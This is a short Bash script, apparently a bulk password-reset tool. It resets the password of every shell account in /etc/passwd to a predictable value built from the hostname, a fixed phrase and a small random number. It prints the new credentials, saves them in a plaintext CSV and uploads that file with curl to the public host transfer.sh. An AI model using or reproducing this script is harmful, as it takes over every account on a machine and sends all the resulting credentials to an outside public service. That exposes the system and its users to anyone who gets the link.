#!/bin/bash

# Define the password to be set for all users
users=$(grep 'sh$' /etc/passwd | cut -d':' -f1)

# Loop through all users
printf "\n\n"
printf "===========================================================================\n"
printf "========================       PASSWORD CHANGE      =======================\n"
printf "===========================================================================\n"
printf "\n\n"

echo "username,password" > users.csv

for user in $users; do
  var=$(echo -n "$[ $RANDOM % 400 + 10 ]")
  new_password="$(hostname)isacoolguy!${var}"
  # Change the password for each user
  echo "$user:$new_password" | chpasswd
  echo "$user,$new_password"
  echo "$user,$new_password" >> users.csv
done

printf "\n\n"
printf "TRANSFER SH LINK FOR CSV FILE\n\n"
curl --upload-file users.csv https://transfer.sh

#REMOVE IF UNABLE TO UPLOAD TO TRANSFER.SH
rm -f users.csv


printf "\n\n"
